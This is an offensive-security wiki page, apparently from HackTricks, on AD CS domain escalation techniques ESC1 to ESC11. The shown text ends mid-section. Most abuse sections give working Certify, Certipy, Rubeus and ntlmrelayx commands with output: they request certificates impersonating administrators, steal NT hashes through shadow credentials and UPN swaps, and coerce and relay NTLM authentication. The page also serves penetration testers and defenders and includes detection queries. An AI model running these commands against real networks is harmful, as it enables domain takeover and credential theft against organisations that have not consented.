# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**This is a summary of escalation technique sections of the posts:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enrolment rights are granted to low-privileged users by the Enterprise CA.**
- **Manager approval is not required.**
- **No signatures from authorized personnel are needed.**
- **Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights.**
- **Certificate templates are configured to define EKUs that facilitate authentication:**
  - Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
- **The ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template:**
  - The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present. This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag permits the specification of the SAN by the requester.

> [!CAUTION]
> The configuration outlined permits low-privileged users to request certificates with any SAN of choice, enabling authentication as any domain principal through Kerberos or SChannel.

This feature is sometimes enabled to support the on-the-fly generation of HTTPS or host certificates by products or deployment services, or due to a lack of understanding.

It is noted that creating a certificate with this option triggers a warning, which is not the case when an existing certificate template (such as the `WebServer` template, which has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled) is duplicated and then modified to include an authentication OID.

### Abuse

To **find vulnerable certificate templates** you can run:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

To **abuse this vulnerability to impersonate an administrator** one could run:

```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```

Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

The Windows binaries "Certreq.exe" & "Certutil.exe" can be used to generate the PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

The enumeration of certificate templates within the AD Forest's configuration schema, specifically those not necessitating approval or signatures, possessing a Client Authentication or Smart Card Logon EKU, and with the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled, can be performed by running the following LDAP query:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Misconfigured Certificate Templates - ESC2

### Explanation

The second abuse scenario is a variation of the first one:

1. Enrollment rights are granted to low-privileged users by the Enterprise CA.
2. The requirement for manager approval is disabled.
3. The need for authorized signatures is omitted.
4. An overly permissive security descriptor on the certificate template grants certificate enrollment rights to low-privileged users.
5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**

The **Any Purpose EKU** permits a certificate to be obtained by an attacker for **any purpose**, including client authentication, server authentication, code signing, etc. The same **technique used for ESC3** can be employed to exploit this scenario.

Certificates with **no EKUs**, which act as subordinate CA certificates, can be exploited for **any purpose** and can **also be used to sign new certificates**. Hence, an attacker could specify arbitrary EKUs or fields in the new certificates by utilizing a subordinate CA certificate.

However, new certificates created for **domain authentication** will not function if the subordinate CA is not trusted by the **`NTAuthCertificates`** object, which is the default setting. Nonetheless, an attacker can still create **new certificates with any EKU** and arbitrary certificate values. These could be potentially **abused** for a wide range of purposes (e.g., code signing, server authentication, etc.) and could have significant implications for other applications in the network like SAML, AD FS, or IPSec.

To enumerate templates that match this scenario within the AD Forest’s configuration schema, the following LDAP query can be run:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

This scenario is like the first and second one but **abusing** a **different EKU** (Certificate Request Agent) and **2 different templates** (therefore it has 2 sets of requirements),

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.

The **“enrollment agent”** enrolls in such a **template** and uses the resulting **certificate to co-sign a CSR on behalf of the other user**. It then **sends** the **co-signed CSR** to the CA, enrolling in a **template** that **permits “enroll on behalf of”**, and the CA responds with a **certificate belong to the “other” user**.

**Requirements 1:**

- Enrollment rights are granted to low-privileged users by the Enterprise CA.
- The requirement for manager approval is omitted.
- No requirement for authorized signatures.
- The security descriptor of the certificate template is excessively permissive, granting enrollment rights to low-privileged users.
- The certificate template includes the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals.

**Requirements 2:**

- The Enterprise CA grants enrollment rights to low-privileged users.
- Manager approval is bypassed.
- The template's schema version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
- An EKU defined in the certificate template permits domain authentication.
- Restrictions for enrollment agents are not applied on the CA.

### Abuse

You can use [**Certify**](https://github.com/GhostPack/Certify) or [**Certipy**](https://github.com/ly4k/Certipy) to abuse this scenario:

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.

Should an **attacker** possess the requisite **permissions** to **alter** a **template** and **institute** any **exploitable misconfigurations** outlined in **prior sections**, privilege escalation could be facilitated.

Notable permissions applicable to certificate templates include:

- **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
- **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
- **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
- **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
- **WriteProperty:** Authorizes the editing of any object properties.

### Abuse

An example of a privesc like the previous one:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

As we can see in the path above, only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** can overwrite the configuration of a certificate template with a single command. By **default**, Certipy will **overwrite** the configuration to make it **vulnerable to ESC1**. We can also specify the **`-save-old` parameter to save the old configuration**, which will be useful for **restoring** the configuration after our attack.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Vulnerable PKI Object Access Control - ESC5

### Explanation

The extensive web of interconnected ACL-based relationships, which includes several objects beyond certificate templates and the certificate authority, can impact the security of the entire AD CS system. These objects, which can significantly affect security, encompass:

- The AD computer object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.
- The RPC/DCOM server of the CA server.
- Any descendant AD object or container within the specific container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.

The security of the PKI system can be compromised if a low-privileged attacker manages to gain control over any of these critical components.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

The subject discussed in the [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) also touches on the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag's implications, as outlined by Microsoft. This configuration, when activated on a Certification Authority (CA), permits the inclusion of **user-defined values** in the **subject alternative name** for **any request**, including those constructed from Active Directory®. Consequently, this provision allows an **intruder** to enroll through **any template** set up for domain **authentication**—specifically those open to **unprivileged** user enrollment, like the standard User template. As a result, a certificate can be secured, enabling the intruder to authenticate as a domain administrator or **any other active entity** within the domain.

**Note**: The approach for appending **alternative names** into a Certificate Signing Request (CSR), through the `-attrib "SAN:"` argument in `certreq.exe` (referred to as “Name Value Pairs”), presents a **contrast** from the exploitation strategy of SANs in ESC1. Here, the distinction lies in **how account information is encapsulated**—within a certificate attribute, rather than an extension.

### Abuse

To verify whether the setting is activated, organizations can utilize the following command with `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

This operation essentially employs **remote registry access**, hence, an alternative approach might be:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Tools like [**Certify**](https://github.com/GhostPack/Certify) and [**Certipy**](https://github.com/ly4k/Certipy) are capable of detecting this misconfiguration and exploiting it:

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

To alter these settings, assuming one possesses **domain administrative** rights or equivalent, the following command can be executed from any workstation:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

To disable this configuration in your environment, the flag can be removed with:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Post the May 2022 security updates, newly issued **certificates** will contain a **security extension** that incorporates the **requester's `objectSid` property**. For ESC1, this SID is derived from the specified SAN. However, for **ESC6**, the SID mirrors the **requester's `objectSid`**, not the SAN.\
> To exploit ESC6, it is essential for the system to be susceptible to ESC10 (Weak Certificate Mappings), which prioritizes the **SAN over the new security extension**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Access control for a certificate authority is maintained through a set of permissions that govern CA actions. These permissions can be viewed by accessing `certsrv.msc`, right-clicking a CA, selecting properties, and then navigating to the Security tab. Additionally, permissions can be enumerated using the PSPKI module with commands such as:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.

#### Abuse

Having **`ManageCA`** rights on a certificate authority enables the principal to manipulate settings remotely using PSPKI. This includes toggling the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag to permit SAN specification in any template, a critical aspect of domain escalation.

Simplification of this process is achievable through the use of PSPKI’s **Enable-PolicyModuleFlag** cmdlet, allowing modifications without direct GUI interaction.

Possession of **`ManageCertificates`** rights facilitates the approval of pending requests, effectively circumventing the "CA certificate manager approval" safeguard.

A combination of **Certify** and **PSPKI** modules can be utilized to request, approve, and download a certificate:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explanation

> [!WARNING]
> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.

Therefore, another attack is presented here.

Perquisites:

- Only **`ManageCA` permission**
- **`Manage Certificates`** permission (can be granted from **`ManageCA`**)
- Certificate template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)

The technique relies on the fact that users with the `Manage CA` _and_ `Manage Certificates` access right can **issue failed certificate requests**. The **`SubCA`** certificate template is **vulnerable to ESC1**, but **only administrators** can enroll in the template. Thus, a **user** can **request** to enroll in the **`SubCA`** - which will be **denied** - but **then issued by the manager afterwards**.

#### Abuse

You can **grant yourself the `Manage Certificates`** access right by adding your user as a new officer.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

The **`SubCA`** template can be **enabled on the CA** with the `-enable-template` parameter. By default, the `SubCA` template is enabled.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

If we have fulfilled the prerequisites for this attack, we can start by **requesting a certificate based on the `SubCA` template**.

**This request will be denie**d, but we will save the private key and note down the request ID.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

With our **`Manage CA` and `Manage Certificates`**, we can then **issue the failed certificate** request with the `ca` command and the `-issue-request <request ID>` parameter.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

And finally, we can **retrieve the issued certificate** with the `req` command and the `-retrieve <request ID>` parameter.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

In addition to the classic ESC7 abuses (enabling EDITF attributes or approving pending requests), **Certify 2.0** revealed a brand-new primitive that only requires the *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) role on the Enterprise CA.

The `ICertAdmin::SetExtension` RPC method can be executed by any principal holding *Manage Certificates*.  While the method was traditionally used by legitimate CAs to update extensions on **pending** requests, an attacker can abuse it to **append a *non-default* certificate extension** (for example a custom *Certificate Issuance Policy* OID such as `1.1.1.1`) to a request that is waiting for approval.

Because the targeted template does **not define a default value for that extension**, the CA will NOT overwrite the attacker-controlled value when the request is eventually issued.  The resulting certificate therefore contains an attacker-chosen extension that may:

* Satisfy Application / Issuance Policy requirements of other vulnerable templates (leading to privilege escalation).
* Inject additional EKUs or policies that grant the certificate unexpected trust in third-party systems.

In short, *Manage Certificates* – previously considered the “less powerful” half of ESC7 – can now be leveraged for full privilege escalation or long-term persistence, without touching CA configuration or requiring the more restrictive *Manage CA* right.

#### Abusing the primitive with Certify 2.0

1. **Submit a certificate request that will remain *pending*.**  This can be forced with a template that requires manager approval:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Append a custom extension to the pending request** using the new `manage-ca` command:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*

3. **Issue the request** (if your role also has *Manage Certificates* approval rights) or wait for an operator to approve it.  Once issued, download the certificate:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. The resulting certificate now contains the malicious issuance-policy OID and can be used in subsequent attacks (e.g. ESC13, domain escalation, etc.).

> NOTE:  The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> In environments where **AD CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published** that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it becomes possible for **any computer with the spooler service active to be compromised by an attacker**!

Several **HTTP-based enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install. These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the `User` or `Machine` certificate templates**.

- The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.

A common **issue** with NTLM relay attacks is the **short duration of NTLM sessions** and the inability of the attacker to interact with services that **require NTLM signing**.

Nevertheless, this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM signing**. For instructions on utilizing a stolen certificate, refer to:

{{#ref}}
account-persistence.md
{{#endref}}

Another limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim account**. The attacker could either wait or attempt to **force** this authentication:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

The `msPKI-Enrollment-Servers` property is used by enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints. These endpoints can be parsed and listed by utilizing the tool **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuse with Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

The request for a certificate is made by Certipy by default based on the template `Machine` or `User`, determined by whether the account name being relayed ends in `$`. The specification of an alternative template can be achieved through the use of the `-template` parameter.

A technique like [PetitPotam](https://github.com/ly4k/PetitPotam) can then be employed to coerce authentication. When dealing with domain controllers, the specification of `-template DomainController` is required.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

The new value **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) for **`msPKI-Enrollment-Flag`**, referred to as ESC9, prevents the embedding of the **new `szOID_NTDS_CA_SECURITY_EXT` security extension** in a certificate. This flag becomes relevant when `StrongCertificateBindingEnforcement` is set to `1` (the default setting), which contrasts with a setting of `2`. Its relevance is heightened in scenarios where a weaker certificate mapping for Kerberos or Schannel might be exploited (as in ESC10), given that the absence of ESC9 would not alter the requirements.

The conditions under which this flag's setting becomes significant include:

- `StrongCertificateBindingEnforcement` is not adjusted to `2` (with the default being `1`), or `CertificateMappingMethods` includes the `UPN` flag.
- The certificate is marked with the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` setting.
- Any client authentication EKU is specified by the certificate.
- `GenericWrite` permissions are available over any account to compromise another.

### Abuse Scenario

Suppose `John@corp.local` holds `GenericWrite` permissions over `Jane@corp.local`, with the goal to compromise `Administrator@corp.local`. The `ESC9` certificate template, which `Jane@corp.local` is permitted to enroll in, is configured with the `CT_FLAG_NO_SECURITY_EXTENSION` flag in its `msPKI-Enrollment-Flag` setting.

Initially, `Jane`'s hash is acquired using Shadow Credentials, thanks to `John`'s `GenericWrite`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Subsequently, `Jane`'s `userPrincipalName` is modified to `Administrator`, purposely omitting the `@corp.local` domain part:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

This modification does not violate constraints, given that `Administrator@corp.local` remains distinct as `Administrator`'s `userPrincipalName`.

Following this, the `ESC9` certificate template, marked vulnerable, is requested as `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

It's noted that the certificate's `userPrincipalName` reflects `Administrator`, devoid of any “object SID”.

`Jane`'s `userPrincipalName` is then reverted to her original, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Attempting authentication with the issued certificate now yields the NT hash of `Administrator@corp.local`. The command must include `-domain <domain>` due to the certificate's lack of domain specification:

```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```

## Weak Certificate Mappings - ESC10

### Explanation

Two registry key values on the domain controller are referred to by ESC10:

- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.

**Case 1**

When `StrongCertificateBindingEnforcement` is configured as `0`.

**Case 2**

If `CertificateMappingMethods` includes the `UPN` bit (`0x4`).

### Abuse Case 1

With `StrongCertificateBindingEnforcement` configured as `0`, an account A with `GenericWrite` permissions can be exploited to compromise any account B.

For instance, having `GenericWrite` permissions over `Jane@corp.local`, an attacker aims to compromise `Administrator@corp.local`. The procedure mirrors ESC9, allowing any certificate template to be utilized.

Initially, `Jane`'s hash is retrieved using Shadow Credentials, exploiting the `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Subsequently, `Jane`'s `userPrincipalName` is altered to `Administrator`, deliberately omitting the `@corp.local` portion to avoid a constraint violation.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Following this, a certificate enabling client authentication is requested as `Jane`, using the default `User` template.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'s `userPrincipalName` is then reverted to its original, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Authenticating with the obtained certificate will yield the NT hash of `Administrator@corp.local`, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Abuse Case 2

With the `CertificateMappingMethods` containing the `UPN` bit flag (`0x4`), an account A with `GenericWrite` permissions can compromise any account B lacking a `userPrincipalName` property, including machine accounts and the built-in domain administrator `Administrator`.

Here, the goal is to compromise `DC$@corp.local`, starting with obtaining `Jane`'s hash through Shadow Credentials, leveraging the `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane`'s `userPrincipalName` is then set to `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

A certificate for client authentication is requested as `Jane` using the default `User` template.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'s `userPrincipalName` is reverted to its original after this process.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

To authenticate via Schannel, Certipy’s `-ldap-shell` option is utilized, indicating authentication success as `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Through the LDAP shell, commands such as `set_rbcd` enable Resource-Based Constrained Delegation (RBCD) attacks, potentially compromising the domain controller.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

This vulnerability also extends to any user account lacking a `userPrincipalName` or where it does not match the `sAMAccountName`, with the default `Administrator@corp.local` being a prime target due to its elevated LDAP privileges and the absence of a `userPrincipalName` by default.

## Relaying NTLM to ICPR - ESC11

### Explanation

If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

You can use `certipy` to enumerate if `Enforce Encryption for Requests` is Disabled and certipy will show `ESC11` Vulnerabilities.

```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Abuse Scenario

It need to setup a relay server:

```bash
